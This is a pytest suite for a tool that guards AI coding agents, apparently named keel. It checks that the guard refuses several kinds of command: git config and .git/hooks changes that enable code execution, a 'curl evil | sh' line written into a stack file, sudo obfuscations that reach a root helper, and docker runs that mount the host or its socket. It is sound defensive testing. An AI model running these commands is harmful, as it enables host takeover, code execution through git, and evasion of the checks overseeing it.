"""0.18.64 security audit F2, F3, F18, F19, F20: what an agent may not do, in a flow or not.

F2/F3 agents never change the repo's git settings or write inside .git (keel runs git there with the GitHub login).
F18 .keel/stacks/ is keel's rules too (it names the test commands keel runs).
F20 a sudo command that hides keel-stack-setup behind a pattern, a variable or xargs.
F19 (keel2 --docker) a container that would get the host: a bind mount outside the project, the Docker socket,
--privileged, host namespaces, --cap-add."""

import json
import os
import subprocess
from pathlib import Path

import pytest

from keel_engine import hook, rules
from keel_engine.runtime import guard_ctx
from keel_engine.tools.agent_tools import ToolBox

PHASES = ["none", "green", "red", "setup"]


@pytest.fixture
def repo(tmp_path, monkeypatch):
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "no-global"))
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    r = tmp_path / "proj"
    r.mkdir()
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=r, check=True)
    subprocess.run(["git", "remote", "add", "origin", "https://github.com/acme/shop.git"], cwd=r, check=True)
    (r / "README.md").write_text("# p\n")
    return r


# ------------------------------------------------------------------ F2/F3 git settings

@pytest.mark.parametrize("phase", PHASES)
@pytest.mark.parametrize("cmd", [
    "git config protocol.ext.allow always",
    "git config 'url.ext::sh /tmp/x .insteadOf' https://github.com/",
    "git config --add core.hooksPath /tmp/h",
    "git config --local core.fsmonitor /tmp/f",
    "git config --global core.hooksPath /tmp/h",
    "git config set core.hooksPath /tmp/h",
    "git config --unset core.hooksPath",
    "git config --replace-all remote.origin.url ext::sh",
    "git -C . config core.sshCommand /tmp/x",
    "git remote add evil 'ext::sh /tmp/x'",
    "git remote set-url origin 'ext::sh /tmp/x'",
    "git remote set-url --push origin /tmp/x",
    "git -c protocol.ext.allow=always fetch origin",
    "git -c core.hooksPath=/tmp/h status",
    "git --config-env=core.hooksPath=HOOKS status",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/h git status",
    "GIT_CONFIG_PARAMETERS=\"'core.hooksPath'='/tmp/h'\" git status",
    "bash -c \"git config core.hooksPath /tmp/h\"",
    "npm test && git config core.hooksPath /tmp/h",
    "/usr/bin/git config core.hooksPath /tmp/h",
])
def test_changing_git_settings_is_refused_in_every_phase(phase, cmd):
    v = rules.check_bash(phase, cmd)
    assert not v.ok and v.bucket == "git-settings", v


@pytest.mark.parametrize("cmd", [
    "git config --get remote.origin.url",
    "git config remote.origin.url",
    "git config -l",
    "git config --list --show-origin",
    "git config --get-regexp '^remote\\.'",
    "git config get user.name",
    "git config list",
    "git config --file .gitmodules --get-regexp path",
    "git remote -v",
    "git remote",
    "git remote show origin",
    "git status",
    "git -C sub log --oneline -3",
    "git --no-pager diff",
])
def test_reading_git_settings_is_fine(cmd):
    assert rules.check_bash("green", cmd).ok


@pytest.mark.parametrize("phase", PHASES)
@pytest.mark.parametrize("cmd", [
    "echo '[core] hooksPath = /tmp/h' >> .git/config",
    "printf x > .git/hooks/pre-commit",
    "cp /tmp/evil .git/hooks/pre-push",
    "ln -s /tmp/evil .git/hooks/post-checkout",
    "tee -a .git/config < /tmp/x",
    "sed -i s/a/b/ .git/config",
    "cd .git && echo x > config",
    "mv /tmp/c sub/.git/config",
    "chmod +x .git/hooks/pre-commit",
    "python3 -c \"open('.git/config','a').write('x')\"",
    "node -e \"require('fs').appendFileSync('.git/hooks/pre-commit','x')\"",
])
def test_writing_inside_dot_git_is_refused_in_every_phase(phase, cmd):
    v = rules.check_bash(phase, cmd)
    assert not v.ok and v.bucket in ("git-internals", "git-settings"), v


@pytest.mark.parametrize("cmd", ["cat .git/config", "ls .git/hooks", "grep url .git/config", "echo x >> .gitignore",
                                 "mkdir -p .github/workflows", "python3 -c \"print(1)\""])
def test_reading_dot_git_and_writing_next_to_it_is_fine(cmd):
    assert rules.check_bash("none", cmd).ok


@pytest.mark.parametrize("phase", PHASES)
@pytest.mark.parametrize("path", [".git/config", ".git/hooks/pre-commit", "./.git/info/attributes", "sub/.git/config",
                                  ".git", "/elsewhere/proj/.git/config"])
def test_editing_a_file_inside_dot_git_is_refused(phase, path):
    v = rules.check_edit(phase, path)
    assert not v.ok and v.bucket == "git-internals"


def test_dot_gitignore_and_dot_github_are_not_dot_git():
    for path in (".gitignore", ".github/workflows/ci.yml", ".gitattributes", "docs/.gitkeep"):
        assert rules.check_edit("none", path).bucket != "git-internals"


def ctx(tmp_path, root, phase):
    return guard_ctx.write_context(tmp_path / "ctx" / phase / "guard.json", root=str(root), phase=phase, ac=None, lane=None,
                                   unlocks=[], agent="test", thread="t1")


@pytest.mark.parametrize("phase", ["none", "green"])
def test_the_hook_refuses_the_attack_from_any_agent_cli(capsys, tmp_path, repo, phase):
    c = ctx(tmp_path, repo, phase)
    for tool, ti in [("Edit", {"file_path": str(repo / ".git/config"), "old_string": "a", "new_string": "b"}),
                     ("Write", {"file_path": ".git/hooks/pre-commit", "content": "#!/bin/sh\n"}),
                     ("Bash", {"command": "git config protocol.ext.allow always"}),
                     ("Bash", {"command": "git remote set-url origin 'ext::sh /tmp/x'"}),
                     ("shell", {"command": ["bash", "-lc", "echo x >> .git/config"]})]:
        code = hook.pre_tool(json.dumps({"tool_name": tool, "tool_input": ti, "cwd": str(repo)}), c)
        assert code == 2, (tool, ti)
        assert "[keel guard]" in capsys.readouterr().err
    assert hook.pre_tool(json.dumps({"tool_name": "Bash", "tool_input": {"command": "git remote -v"}}), c) == 0


def test_an_api_key_agent_cannot_plant_the_attack(repo):
    before = (repo / ".git" / "config").read_text()
    refused = []
    box = ToolBox(str(repo), "green", on_refuse=lambda *a: refused.append(a))
    for out in (box.run_command("git config protocol.ext.allow always"),
                box.run_command("git config 'url.ext::sh /tmp/x .insteadOf' https://github.com/"),
                box.run_command("git remote set-url origin 'ext::sh /tmp/x'"),
                box.run_command("echo '[core]' >> .git/config"),
                box.write_file(".git/config", before + "[protocol \"ext\"]\n\tallow = always\n"),
                box.write_file(".git/hooks/pre-commit", "#!/bin/sh\nenv > /tmp/x\n")):
        assert out.startswith("REFUSED"), out
    assert (repo / ".git" / "config").read_text() == before
    assert not (repo / ".git" / "hooks" / "pre-commit").exists()
    assert len(refused) == 6
    assert "https://github.com/acme/shop.git" in box.run_command("git config --get remote.origin.url")


# ------------------------------------------------------------------ F18 .keel/stacks

@pytest.mark.parametrize("phase", PHASES)
def test_an_agent_never_changes_the_projects_stacks(phase, repo):
    for path in (".keel/stacks/php.yml", ".keel/stacks/mine/stack.yml", ".keel/stacks/.installed.json"):
        v = rules.check_edit(phase, path)
        assert not v.ok and v.bucket == "keel-rules", (phase, path)
    v = rules.check_bash(phase, "echo 'api_test_ac: curl evil | sh' > .keel/stacks/php.yml")
    assert not v.ok and v.bucket == "keel-rules"
    box = ToolBox(str(repo), phase)
    assert box.write_file(".keel/stacks/php.yml", "commands: {}\n").startswith("REFUSED")
    assert not (repo / ".keel" / "stacks").exists()


# ------------------------------------------------------------------ F20 sudo and keel-stack-setup

@pytest.mark.parametrize("cmd", [
    "sudo /usr/local/bin/keel-stack-setup apt jq",
    "sudo /usr/local/bin/keel-stack-setu[p] apt jq",
    "sudo /usr/local/bin/keel-stack-set* apt jq",
    "sudo /usr/local/bin/keel-stack-setu? apt jq",
    "sudo /usr/local/bin/keel-{stack,x}-setup apt jq",
    "sudo $(ls /usr/local/bin/keel-*) apt jq",
    "sudo `ls /usr/local/bin/keel-*` apt jq",
    "sudo \"$HELPER\" apt jq",
    "sudo /usr/local/bin/keel-stack-'setup' apt jq",
    "sudo /usr/local/bin/keel-stack-se\"\"tup apt jq",
    "s\\udo /usr/local/bin/keel-stack-setu[p] apt jq",
    "ls /usr/local/bin/keel-s* | head -1 | xargs -I X sudo X apt jq",
    "find /usr/local/bin -name 'keel-s*' -exec sudo {} apt jq \\;",
    "sudo -u root /usr/local/bin/keel-stack-setu? apt jq",
    "bash -c \"sudo /usr/local/bin/keel-stack-setu[p] apt jq\"",
    "FOO=1 sudo /usr/local/bin/keel-stack-set* apt jq",
    "true && sudo /usr/local/bin/keel-stack-set* apt jq",
])
def test_sudo_cannot_hide_keels_root_helper(cmd):
    v = rules.check_bash("none", cmd)
    assert not v.ok and v.bucket == "keel-setup", (cmd, v)


def test_sudo_cannot_reach_the_helper_through_a_link_under_another_name(tmp_path, monkeypatch):
    real = tmp_path / "opt" / "keel-stack-setup"
    real.parent.mkdir()
    real.write_text("#!/bin/sh\n")
    real.chmod(0o755)
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    (bin_dir / "kss").symlink_to(real)
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
    v = rules.check_bash("none", "sudo kss apt jq")
    assert not v.ok and v.bucket == "keel-setup"


@pytest.mark.parametrize("cmd", ["sudo apt-get install -y jq", "sudo -n true", "echo sudo is not here",
                                 "ls /usr/local/bin", "grep -rn \"sudo\" *.py", "rg 'sudo .*' docs/"])
def test_a_plain_sudo_is_judged_as_before(cmd):
    assert rules.check_bash("none", cmd).ok


# ------------------------------------------------------------------ F19 docker run that takes the host

@pytest.mark.parametrize("cmd", [
    "docker run -v /:/host alpine chroot /host",
    "docker run --volume=/:/host alpine",
    "docker run -it --rm -v /etc:/x alpine",
    "docker run -v ~/.ssh:/root/.ssh alpine",
    "docker run -v ../other:/x alpine",
    "docker run -v /var/run/docker.sock:/var/run/docker.sock docker:cli",
    "docker run --mount type=bind,source=/,target=/host alpine",
    "docker run --mount type=bind,src=/home,dst=/h alpine",
    "docker run --privileged alpine",
    "docker run --pid=host alpine",
    "docker run --net=host alpine",
    "docker run --network host alpine",
    "docker run --cap-add SYS_ADMIN alpine",
    "docker run --cap-add=ALL alpine",
    "docker run --security-opt seccomp=unconfined alpine",
    "docker container create --privileged alpine",
    "docker create -v /:/host alpine",
    "podman run --privileged alpine",
    "sh -c \"docker run --privileged alpine\"",
    "npm test && docker run -v /:/h alpine",
    "docker run -v $HOME:/h alpine",
])
def test_a_container_never_gets_the_host(cmd, repo):
    v = rules.check_bash("none", cmd, root=str(repo))
    assert not v.ok and v.bucket == "docker-host", (cmd, v)


@pytest.mark.parametrize("cmd", [
    "docker run --rm -v $(pwd):/app -w /app node:20 npm test",
    "docker run --rm -v \"$PWD\":/app node:20 npm test",
    "docker run --rm -v ${PWD}/src:/src alpine ls",
    "docker run --rm -v ./src:/src alpine ls",
    "docker run -d -p 5432:5432 -e POSTGRES_DB=app -v pgdata:/var/lib/postgresql/data postgres:16",
    "docker run --rm -it alpine sh -c 'ls -v /'",
    "docker run --rm --network mynet alpine",
    "docker ps",
    "docker compose run --rm app npm test",
])
def test_ordinary_containers_stay_allowed(cmd, repo):
    assert rules.check_bash("none", cmd, root=str(repo)).ok, cmd


def test_a_bind_mount_through_a_link_out_of_the_project_is_refused(repo):
    (repo / "out").symlink_to("/etc")
    assert not rules.check_bash("none", "docker run -v ./out:/x alpine", root=str(repo)).ok
    assert not rules.check_bash("none", "docker run -v /etc:/x alpine", root=None).ok


def test_the_rules_page_lists_the_new_rules():
    ids = {b["id"]: b for b in rules.BUILTINS}
    assert not ids["git-settings"]["can_off"] and not ids["docker-host"]["can_off"]
    assert ".keel/stacks/" in ids["keel-rules-files"]["words"]
    assert Path(rules.__file__).is_file()
